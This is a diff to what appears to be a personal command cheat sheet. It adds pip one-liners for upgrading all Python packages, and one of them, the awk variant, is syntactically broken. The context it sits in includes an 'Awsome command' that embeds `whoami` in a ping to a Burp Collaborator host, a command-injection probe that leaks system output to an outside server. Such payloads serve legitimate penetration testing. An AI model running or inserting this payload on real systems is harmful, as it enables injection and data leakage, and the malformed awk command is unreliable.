@@ -4,6 +4,21 @@
 - https://www.virustotal.com/gui/
 - https://packettotal.com/
 
+### update all package with pip
+- Windows
+```
+pip freeze | %{$_.split('==')[0]} | %{pip install --upgrade $_}
+```
+- Linux
+```
+>To upgrade all packages using pip with grep on Ubuntu Linux:
+pip3 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 install -U 
+
+>To upgrade all packages using pip with awk on Ubuntu Linux:
+pip3 list -o | cut -f1 -d' ' | tr " " "\n" | awk '{if(NR>=3)print)' | cut -d' ' -f1 | xargs -n1 pip3 install -U 
+
+```
+
 ### Awsome command
 ```
 ping `whoami`.fexpwcppysiky1grj7mbodap5gb7zw.burpcollaborator.net
